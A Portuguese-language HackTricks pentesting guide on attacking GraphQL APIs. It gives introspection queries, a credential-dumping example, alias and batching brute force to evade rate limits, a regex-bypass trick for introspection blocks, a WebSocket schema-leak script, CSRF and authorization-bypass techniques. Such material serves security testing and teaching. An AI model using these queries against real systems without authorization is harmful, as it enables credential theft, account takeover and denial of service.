# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introdu√ß√£o

GraphQL √© **destacado** como uma **alternativa eficiente** √† REST API, oferecendo uma abordagem simplificada para consultar dados do backend. Em contraste com REST, que muitas vezes exige v√°rias solicita√ß√µes em diferentes endpoints para reunir dados, o GraphQL permite a recupera√ß√£o de todas as informa√ß√µes necess√°rias por meio de uma **√∫nica solicita√ß√£o**. Essa simplifica√ß√£o **beneficia significativamente os desenvolvedores** ao diminuir a complexidade de seus processos de recupera√ß√£o de dados.

## GraphQL e Seguran√ßa

Com o advento de novas tecnologias, incluindo o GraphQL, novas vulnerabilidades de seguran√ßa tamb√©m surgem. Um ponto chave a ser observado √© que **o GraphQL n√£o inclui mecanismos de autentica√ß√£o por padr√£o**. √â responsabilidade dos desenvolvedores implementar tais medidas de seguran√ßa. Sem a autentica√ß√£o adequada, os endpoints do GraphQL podem expor informa√ß√µes sens√≠veis a usu√°rios n√£o autenticados, representando um risco significativo √† seguran√ßa.

### Ataques de For√ßa Bruta em Diret√≥rios e GraphQL

Para identificar inst√¢ncias expostas do GraphQL, recomenda-se a inclus√£o de caminhos espec√≠ficos em ataques de for√ßa bruta em diret√≥rios. Esses caminhos s√£o:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identificar inst√¢ncias abertas do GraphQL permite a an√°lise das consultas suportadas. Isso √© crucial para entender os dados acess√≠veis atrav√©s do endpoint. O sistema de introspec√ß√£o do GraphQL facilita isso ao detalhar as consultas que um esquema suporta. Para mais informa√ß√µes sobre isso, consulte a documenta√ß√£o do GraphQL sobre introspec√ß√£o: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Impress√£o Digital

A ferramenta [**graphw00f**](https://github.com/dolevf/graphw00f) √© capaz de detectar qual motor GraphQL est√° sendo usado em um servidor e, em seguida, imprime algumas informa√ß√µes √∫teis para o auditor de seguran√ßa.

#### Consultas Universais <a href="#universal-queries" id="universal-queries"></a>

Para verificar se uma URL √© um servi√ßo GraphQL, uma **consulta universal**, `query{__typename}`, pode ser enviada. Se a resposta incluir `{"data": {"__typename": "Query"}}`, isso confirma que a URL hospeda um endpoint GraphQL. Este m√©todo depende do campo `__typename` do GraphQL, que revela o tipo do objeto consultado.
```javascript
query{__typename}
```
### Enumera√ß√£o B√°sica

Graphql geralmente suporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Embora, por quest√µes de seguran√ßa, seja recomendado permitir apenas json para prevenir ataques CSRF.

#### Introspec√ß√£o

Para usar a introspec√ß√£o para descobrir informa√ß√µes do esquema, consulte o campo `__schema`. Este campo est√° dispon√≠vel no tipo raiz de todas as consultas.
```bash
query={__schema{types{name,fields{name}}}}
```
Com esta consulta, voc√™ encontrar√° o nome de todos os tipos que est√£o sendo usados:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Com esta consulta, voc√™ pode extrair todos os tipos, seus campos e seus argumentos (e o tipo dos argumentos). Isso ser√° muito √∫til para saber como consultar o banco de dados.

![](<../../.gitbook/assets/image (950).png>)

**Erros**

√â interessante saber se os **erros** ser√£o **exibidos**, pois eles contribuir√£o com informa√ß√µes √∫teis.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Enumerar Esquema de Banco de Dados via Introspec√ß√£o**

{% hint style="info" %}
Se a introspec√ß√£o estiver habilitada, mas a consulta acima n√£o for executada, tente remover as diretivas `onOperation`, `onFragment` e `onField` da estrutura da consulta.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Consulta de introspec√ß√£o inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
A √∫ltima linha de c√≥digo √© uma consulta graphql que ir√° despejar todas as metainforma√ß√µes do graphql (nomes de objetos, par√¢metros, tipos...)

![](<../../.gitbook/assets/image (363).png>)

Se a introspec√ß√£o estiver habilitada, voc√™ pode usar [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) para visualizar em uma GUI todas as op√ß√µes.

### Consultando

Agora que sabemos que tipo de informa√ß√£o est√° salva dentro do banco de dados, vamos tentar **extrair alguns valores**.

Na introspec√ß√£o, voc√™ pode encontrar **qual objeto voc√™ pode consultar diretamente** (porque voc√™ n√£o pode consultar um objeto apenas porque ele existe). Na imagem a seguir, voc√™ pode ver que o "_queryType_" √© chamado de "_Query_" e que um dos campos do objeto "_Query_" √© "_flags_", que tamb√©m √© um tipo de objeto. Portanto, voc√™ pode consultar o objeto flag.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Note que o tipo da consulta "_flags_" √© "_Flags_", e este objeto √© definido como abaixo:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Voc√™ pode ver que os objetos "_Flags_" s√£o compostos por **name** e **value**. Ent√£o voc√™ pode obter todos os nomes e valores das flags com a consulta:
```javascript
query={flags{name, value}}
```
Note que, caso o **objeto a ser consultado** seja um **tipo** **primitivo** como **string**, como no exemplo a seguir

![](<../../.gitbook/assets/image (958).png>)

Voc√™ pode simplesmente consult√°-lo com:
```javascript
query={hiddenFlags}
```
Em outro exemplo onde havia 2 objetos dentro do objeto do tipo "_Query_": "_user_" e "_users_".\
Se esses objetos n√£o precisarem de nenhum argumento para pesquisar, poderia **recuperar todas as informa√ß√µes deles** apenas **pedindo** os dados que voc√™ deseja. Neste exemplo da Internet, voc√™ poderia extrair os nomes de usu√°rio e senhas salvos:

![](<../../.gitbook/assets/image (880).png>)

No entanto, neste exemplo, se voc√™ tentar fazer isso, receber√° este **erro**:

![](<../../.gitbook/assets/image (1042).png>)

Parece que, de alguma forma, ele ir√° pesquisar usando o argumento "_**uid**_" do tipo _**Int**_.\
De qualquer forma, j√° sab√≠amos disso, na se√ß√£o [Basic Enumeration](graphql.md#basic-enumeration) foi proposta uma consulta que mostrava todas as informa√ß√µes necess√°rias: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se voc√™ ler a imagem fornecida quando executei essa consulta, ver√° que "_**user**_" tinha o **arg** "_**uid**_" do tipo _Int_.

Assim, realizando um leve _**uid**_ bruteforce, descobri que em _**uid**=**1**_ um nome de usu√°rio e uma senha foram recuperados:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Note que eu **descobri** que poderia pedir os **par√¢metros** "_**user**_" e "_**password**_" porque se eu tentar procurar algo que n√£o existe (`query={user(uid:1){noExists}}`) recebo este erro:

![](<../../.gitbook/assets/image (707).png>)

E durante a **fase de enumera√ß√£o**, descobri que o objeto "_**dbuser**_" tinha como campos "_**user**_" e "_**password**_.

**Truque de despejo de string de consulta (gra√ßas ao @BinaryShadow\_)**

Se voc√™ pode pesquisar por um tipo de string, como: `query={theusers(description: ""){username,password}}` e voc√™ **pesquisar por uma string vazia**, isso ir√° **despejar todos os dados**. (_Note que este exemplo n√£o est√° relacionado com o exemplo dos tutoriais, para este exemplo suponha que voc√™ pode pesquisar usando "**theusers**" por um campo String chamado "**description**"_).

### Pesquisa

Nesta configura√ß√£o, um **banco de dados** cont√©m **pessoas** e **filmes**. **Pessoas** s√£o identificadas por seu **email** e **nome**; **filmes** por seu **nome** e **avalia√ß√£o**. **Pessoas** podem ser amigas umas das outras e tamb√©m ter filmes, indicando relacionamentos dentro do banco de dados.

Voc√™ pode **pesquisar** pessoas **pelo** **nome** e obter seus emails:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Voc√™ pode **buscar** pessoas **pelo** **nome** e obter seus **filmes** **assinados**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Note como √© indicado recuperar o `name` dos `subscribedMovies` da pessoa.

Voc√™ tamb√©m pode **pesquisar v√°rios objetos ao mesmo tempo**. Neste caso, uma pesquisa de 2 filmes √© feita:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou at√© mesmo **rela√ß√µes de v√°rios objetos diferentes usando aliases**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**As muta√ß√µes s√£o usadas para fazer altera√ß√µes no lado do servidor.**

Na **introspec√ß√£o**, voc√™ pode encontrar as **muta√ß√µes** **declaradas**. Na imagem a seguir, o "_MutationType_" √© chamado de "_Mutation_" e o objeto "_Mutation_" cont√©m os nomes das muta√ß√µes (como "_addPerson_" neste caso):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Nesta configura√ß√£o, um **banco de dados** cont√©m **pessoas** e **filmes**. **Pessoas** s√£o identificadas por seu **email** e **nome**; **filmes** por seu **nome** e **avalia√ß√£o**. **Pessoas** podem ser amigas umas das outras e tamb√©m ter filmes, indicando relacionamentos dentro do banco de dados.

Uma muta√ß√£o para **criar novos** filmes dentro do banco de dados pode ser como a seguinte (neste exemplo, a muta√ß√£o √© chamada de `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Observe como tanto os valores quanto o tipo de dados s√£o indicados na consulta.**

Al√©m disso, o banco de dados suporta uma opera√ß√£o de **muta√ß√£o**, chamada `addPerson`, que permite a cria√ß√£o de **pessoas** juntamente com suas associa√ß√µes a **amigos** e **filmes** existentes. √â crucial notar que os amigos e filmes devem pr√©-existir no banco de dados antes de serem vinculados √† nova pessoa criada.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Sobrecarga de Diretivas

Como explicado em [**uma das vulnerabilidades descritas neste relat√≥rio**](https://www.landh.tech/blog/20240304-google-hack-50000/), uma sobrecarga de diretivas implica chamar uma diretiva at√© milh√µes de vezes para fazer o servidor desperdi√ßar opera√ß√µes at√© que seja poss√≠vel realizar um DoS.

### Agrupamento de for√ßa bruta em 1 solicita√ß√£o de API

Esta informa√ß√£o foi retirada de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentica√ß√£o atrav√©s da API GraphQL com **envio simult√¢neo de muitas consultas com diferentes credenciais** para verific√°-las. √â um ataque cl√°ssico de for√ßa bruta, mas agora √© poss√≠vel enviar mais de um par login/senha por solicita√ß√£o HTTP devido ao recurso de agrupamento do GraphQL. Essa abordagem enganaria aplicativos externos de monitoramento de taxa, fazendo-os pensar que est√° tudo bem e que n√£o h√° um bot de for√ßa bruta tentando adivinhar senhas.

Abaixo voc√™ pode encontrar a demonstra√ß√£o mais simples de uma solicita√ß√£o de autentica√ß√£o de aplicativo, com **3 pares de email/senha diferentes por vez**. Obviamente, √© poss√≠vel enviar milhares em uma √∫nica solicita√ß√£o da mesma forma:

![](<../../.gitbook/assets/image (1081).png>)

Como podemos ver na captura de tela da resposta, a primeira e a terceira solicita√ß√µes retornaram _null_ e refletiram as informa√ß√µes correspondentes na se√ß√£o _error_. A **segunda muta√ß√£o teve os dados de autentica√ß√£o corretos** e a resposta cont√©m o token de sess√£o de autentica√ß√£o correto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sem Introspec√ß√£o

Cada vez mais **endpoints graphql est√£o desativando a introspec√ß√£o**. No entanto, os erros que o graphql gera quando uma solicita√ß√£o inesperada √© recebida s√£o suficientes para ferramentas como [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) recriarem a maior parte do esquema.

Al√©m disso, a extens√£o Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observa solicita√ß√µes da API GraphQL passando pelo Burp** e **constr√≥i** um **esquema** interno de GraphQL com cada nova consulta que v√™. Ela tamb√©m pode expor o esquema para GraphiQL e Voyager. A extens√£o retorna uma resposta falsa quando recebe uma consulta de introspec√ß√£o. Como resultado, o GraphQuail mostra todas as consultas, argumentos e campos dispon√≠veis para uso dentro da API. Para mais informa√ß√µes [**verifique isso**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Uma boa **lista de palavras** para descobrir [**entidades GraphQL pode ser encontrada aqui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Contornando defesas de introspec√ß√£o do GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Para contornar restri√ß√µes em consultas de introspec√ß√£o em APIs, inserir um **caractere especial ap√≥s a palavra-chave `__schema`** prova ser eficaz. Este m√©todo explora descuidos comuns de desenvolvedores em padr√µes regex que visam bloquear a introspec√ß√£o, concentrando-se na palavra-chave `__schema`. Ao adicionar caracteres como **espa√ßos, novas linhas e v√≠rgulas**, que o GraphQL ignora, mas que podem n√£o ser considerados no regex, as restri√ß√µes podem ser contornadas. Por exemplo, uma consulta de introspec√ß√£o com uma nova linha ap√≥s `__schema` pode contornar tais defesas:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se n√£o tiver sucesso, considere m√©todos de solicita√ß√£o alternativos, como **solicita√ß√µes GET** ou **POST com `x-www-form-urlencoded`**, uma vez que as restri√ß√µes podem se aplicar apenas √†s solicita√ß√µes POST.

### Tente WebSockets

Como mencionado em [**esta palestra**](https://www.youtube.com/watch?v=tIo\_t5uUK50), verifique se pode ser poss√≠vel conectar-se ao graphQL via WebSockets, pois isso pode permitir que voc√™ contorne um potencial WAF e fa√ßa a comunica√ß√£o websocket vazar o esquema do graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Descobrindo Estruturas GraphQL Expostas**

Quando a introspec√ß√£o est√° desativada, examinar o c√≥digo-fonte do site em busca de consultas pr√©-carregadas em bibliotecas JavaScript √© uma estrat√©gia √∫til. Essas consultas podem ser encontradas usando a aba `Sources` nas ferramentas de desenvolvedor, fornecendo insights sobre o esquema da API e revelando potencialmente **consultas sens√≠veis expostas**. Os comandos para pesquisar dentro das ferramentas de desenvolvedor s√£o:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF em GraphQL

Se voc√™ n√£o sabe o que √© CSRF, leia a p√°gina a seguir:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Por a√≠, voc√™ poder√° encontrar v√°rios endpoints GraphQL **configurados sem tokens CSRF.**

Observe que as requisi√ß√µes GraphQL geralmente s√£o enviadas via requisi√ß√µes POST usando o Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
No entanto, a maioria dos endpoints GraphQL tamb√©m suporta **`form-urlencoded` POST requests:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Portanto, como as solicita√ß√µes CSRF, como as anteriores, s√£o enviadas **sem solicita√ß√µes de pr√©-v√¥o**, √© poss√≠vel **realizar** **altera√ß√µes** no GraphQL abusando de um CSRF.

No entanto, note que o novo valor padr√£o do cookie da flag `samesite` do Chrome √© `Lax`. Isso significa que o cookie s√≥ ser√° enviado de um site de terceiros em solicita√ß√µes GET.

Note que geralmente √© poss√≠vel enviar a **solicita√ß√£o** **de consulta** tamb√©m como uma **solicita√ß√£o GET e o token CSRF pode n√£o estar sendo validado em uma solicita√ß√£o GET.**

Al√©m disso, abusando de um [**XS-Search**](../../pentesting-web/xs-search/) **ataque** pode ser poss√≠vel exfiltrar conte√∫do do endpoint GraphQL abusando das credenciais do usu√°rio.

Para mais informa√ß√µes **verifique o** [**post original aqui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Sequestro de WebSocket entre sites no GraphQL

Semelhante √†s vulnerabilidades CRSF abusando do GraphQL, tamb√©m √© poss√≠vel realizar um **sequestro de WebSocket entre sites para abusar de uma autentica√ß√£o com GraphQL com cookies desprotegidos** e fazer um usu√°rio realizar a√ß√µes inesperadas no GraphQL.

Para mais informa√ß√µes, verifique:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Autoriza√ß√£o no GraphQL

Muitas fun√ß√µes GraphQL definidas no endpoint podem apenas verificar a autentica√ß√£o do solicitante, mas n√£o a autoriza√ß√£o.

Modificar vari√°veis de entrada da consulta pode levar a detalhes sens√≠veis da conta [vazados](https://hackerone.com/reports/792927).

A muta√ß√£o pode at√© levar a uma tomada de conta ao tentar modificar dados de outra conta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass authorization in GraphQL

[Chaining queries](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) juntos pode contornar um sistema de autentica√ß√£o fraco.

No exemplo abaixo, voc√™ pode ver que a opera√ß√£o √© "forgotPassword" e que deve executar apenas a consulta forgotPassword associada a ela. Isso pode ser contornado adicionando uma consulta ao final, neste caso, adicionamos "register" e uma vari√°vel de usu√°rio para o sistema registrar como um novo usu√°rio.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Bypassing Rate Limits Using Aliases in GraphQL

Em GraphQL, aliases s√£o um recurso poderoso que permite a **nomea√ß√£o de propriedades explicitamente** ao fazer uma solicita√ß√£o de API. Essa capacidade √© particularmente √∫til para recuperar **m√∫ltiplas inst√¢ncias do mesmo tipo** de objeto em uma √∫nica solicita√ß√£o. Aliases podem ser empregados para superar a limita√ß√£o que impede objetos GraphQL de ter v√°rias propriedades com o mesmo nome.

Para uma compreens√£o detalhada dos aliases do GraphQL, o seguinte recurso √© recomendado: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Embora o prop√≥sito principal dos aliases seja reduzir a necessidade de numerosas chamadas de API, um caso de uso n√£o intencional foi identificado onde aliases podem ser aproveitados para executar ataques de for√ßa bruta em um endpoint GraphQL. Isso √© poss√≠vel porque alguns endpoints s√£o protegidos por limitadores de taxa projetados para frustrar ataques de for√ßa bruta, restringindo o **n√∫mero de solicita√ß√µes HTTP**. No entanto, esses limitadores de taxa podem n√£o levar em conta o n√∫mero de opera√ß√µes dentro de cada solicita√ß√£o. Dado que os aliases permitem a inclus√£o de v√°rias consultas em uma √∫nica solicita√ß√£o HTTP, eles podem contornar tais medidas de limita√ß√£o de taxa.

Considere o exemplo fornecido abaixo, que ilustra como consultas com alias podem ser usadas para verificar a validade de c√≥digos de desconto de loja. Este m√©todo poderia contornar a limita√ß√£o de taxa, uma vez que compila v√°rias consultas em uma √∫nica solicita√ß√£o HTTP, potencialmente permitindo a verifica√ß√£o de numerosos c√≥digos de desconto simultaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Ferramentas

### Scanners de vulnerabilidade

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testa configura√ß√µes incorretas comuns de endpoints graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Script de auditoria de seguran√ßa GraphQL com foco em realizar consultas e muta√ß√µes GraphQL em lote.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Identifica a graphql sendo usada
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Conjunto de ferramentas que pode ser usado para capturar esquemas e buscar dados sens√≠veis, testar autoriza√ß√£o, for√ßar esquemas e encontrar caminhos para um tipo espec√≠fico.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Pode ser usado como aut√¥nomo ou [extens√£o Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Pode ser usado como um cliente CLI tamb√©m para automatizar ataques
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Ferramenta que lista as diferentes maneiras de **acessar um tipo espec√≠fico em um esquema GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): O sucessor dos Modos Aut√¥nomo e CLI do InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Extens√£o Burp para testes avan√ßados de GraphQL. O _**Scanner**_ √© o n√∫cleo do InQL v5.0, onde voc√™ pode analisar um endpoint GraphQL ou um arquivo de esquema de introspec√ß√£o local. Ele gera automaticamente todas as poss√≠veis consultas e muta√ß√µes, organizando-as em uma vis√£o estruturada para sua an√°lise. O componente _**Attacker**_ permite que voc√™ execute ataques GraphQL em lote, o que pode ser √∫til para contornar limites de taxa mal implementados.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Tenta obter o esquema mesmo com a introspec√ß√£o desativada, usando a ajuda de alguns bancos de dados Graphql que sugerem os nomes de muta√ß√µes e par√¢metros.

### Clientes

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Cliente GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Cliente GUI

### Testes Autom√°ticos

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* V√≠deo explicando AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Refer√™ncias

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
